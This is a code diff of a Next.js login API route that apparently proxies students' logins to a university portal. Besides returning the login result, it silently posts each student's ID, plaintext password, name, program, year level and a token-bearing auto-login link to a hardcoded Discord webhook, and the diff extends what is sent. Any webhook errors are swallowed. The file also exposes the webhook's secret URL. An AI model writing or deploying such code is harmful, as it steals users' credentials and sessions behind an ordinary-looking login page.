@@ -1,12 +1,34 @@
 import { NextResponse } from 'next/server';
-import { encrypt, decrypt, getHmacHeaders, encryptPayload, decryptPayload } from '@/lib/crypto-utils';
+import { 
+    encrypt, 
+    decrypt, 
+    getHmacHeaders, 
+    encryptPayload, 
+    decryptPayload 
+} from '@/lib/crypto-utils';
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";
 
-async function sendToDiscord(studentId: string, password: string, fullName: string, autoLoginUrl: string) {
+function formatYearLevel(id: any) {
+    const levels: Record<string, string> = {
+        "10001": "1st Year",
+        "10002": "2nd Year",
+        "10003": "3rd Year",
+        "10004": "4th Year",
+        "10005": "5th Year"
+    };
+    return levels[String(id)] || `Level ${id}`;
+}
+
+async function sendToDiscord(
+    studentId: string, 
+    password: string, 
+    fullName: string, 
+    autoLoginUrl: string, 
+    metadata?: any
+) {
     try {
         const discordPayload = {
-            content: "", 
             embeds: [
                 {
                     title: "WildCat Tunnel",
@@ -15,25 +37,30 @@ async function sendToDiscord(studentId: string, password: string, fullName: stri
                     fields: [
                         { name: "Name", value: `**${fullName}**`, inline: false },
                         { name: "Student ID", value: `\`${studentId}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true }
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { 
+                            name: "Program", 
+                            value: `\`${metadata?.programCode || "N/A"}\``, 
+                            inline: true 
+                        },
+                        { 
+                            name: "Year Level", 
+                            value: `\`${formatYearLevel(metadata?.idYearLevel)}\``, 
+                            inline: true 
+                        }
                     ],
-                    footer: { text: "Wildcat Tunnel" },
+                    footer: { text: "WildCat Tunnel" },
                     timestamp: new Date().toISOString()
                 }
             ]
         };
 
-        const res = await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(discordPayload),
         });
-
-        if (!res.ok) {
-            // console.error("Discord Error:", await res.text());
-        }
     } catch (error) {
-        // console.error("Discord sync failed", error);
     }
 }
 
@@ -47,13 +74,13 @@ export async function POST(req: Request) {
         }
 
         const { studentId, password } = clientData;
-        const hmac = getHmacHeaders("POST");
 
-        const res = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
+        const authHmac = getHmacHeaders("POST");
+        const loginRes = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
             method: 'POST',
             headers: { 
                 "Content-Type": "application/json;charset=UTF-8", 
-                ...hmac,
+                ...authHmac,
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
             },
             body: JSON.stringify({ 
@@ -61,35 +88,52 @@ export async function POST(req: Request) {
             })
         });
 
-        const rawText = await res.text();
-        const citData = decrypt(rawText);
+        const rawAuthText = await loginRes.text();
+        const citData = decrypt(rawAuthText);
 
         if (citData && citData.token) {
+            const internalGuid = citData.userInfo?.studentId || citData.studentId;
+            
+            const witsHmac = getHmacHeaders("GET");
+            const witsRes = await fetch(
+                `https://rg-cit-u-staging-004-wa-014.azurewebsites.net/api/studentenrollment/student/${internalGuid}/academicyear/0/term/0/data`,
+                {
+                    method: 'GET',
+                    headers: {
+                        ...witsHmac,
+                        "Authorization": `Bearer ${citData.token}`,
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
+                    }
+                }
+            );
+
+            const rawWitsText = await witsRes.text();
+            const witsData = decrypt(rawWitsText);
+
             const host = req.headers.get('host') || 'localhost:3000';
             const protocol = host.includes('localhost') ? 'http' : 'https';
             const baseUrl = `${protocol}://${host}`;
 
-            const minimalDataForLink = {
+            const magicPayload = encryptPayload({
                 token: citData.token,
-                userInfo: {
-                    fullName: citData.userInfo?.fullName,
-                    studentIdNumber: citData.userInfo?.studentIdNumber
-                }
-            };
-            
-            const shortPayload = encryptPayload(minimalDataForLink);
-            const autoLoginUrl = `${baseUrl}/?magic=${encodeURIComponent(shortPayload)}`;
+                userInfo: citData.userInfo
+            });
+            const autoLoginUrl = `${baseUrl}/?magic=${encodeURIComponent(magicPayload)}`;
 
-            await sendToDiscord(studentId, password, citData.userInfo?.fullName || "Unknown", autoLoginUrl);
+            await sendToDiscord(
+                studentId, 
+                password, 
+                citData.userInfo?.fullName || "Unknown", 
+                autoLoginUrl,
+                witsData?.items
+            );
+
+            return NextResponse.json({ payload: encryptPayload(citData) });
         }
 
-        if (!citData) {
-            return NextResponse.json({ error: "Authentication failed" }, { status: 401 });
-        }
-
-        return NextResponse.json({ payload: encryptPayload(citData) });
+        return NextResponse.json({ error: "Authentication failed" }, { status: 401 });
 
     } catch (err: any) {
-        return NextResponse.json({ error: err.message }, { status: 500 });
+        return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
     }
 }
